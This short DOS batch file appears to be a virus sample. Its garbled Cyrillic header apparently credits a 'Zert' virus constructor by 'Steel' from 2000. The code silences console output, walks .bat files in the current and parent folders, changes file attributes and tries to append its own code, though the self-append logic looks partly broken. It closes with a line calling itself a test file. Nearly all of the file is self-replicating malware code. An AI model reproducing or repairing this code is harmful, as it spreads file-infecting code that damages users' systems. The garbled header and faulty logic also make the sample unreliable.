:<<<< 旼컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴커 >>>>
:<<<< �   앪�� �젵� 貰ℓ젺 Zert ぎ�飡說も�昔�!   � >>>>
:<<<< �             ver 1.0 by Steel.            � >>>>
:<<<< �    Zert 췅�ⓤ젺 � 맢遜Ŀ � 2000 ．ㅳ     � >>>>
:<<<< 읕컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴켸 >>>>
@ctty nul
if "%0"=="AUTOEXEC.BAT" exit
attrib %0 +r
for %%w in (*.bat ..\*.bat) do set Muha =%%w
attrib %0 -r
for %%q in (%0) do find "%0" %%q
if not errorlevel 1 goto ok
type %0 >> %0
goto ok
:ok
attrib %0 -r
@ctty con
Echo This is a test file.
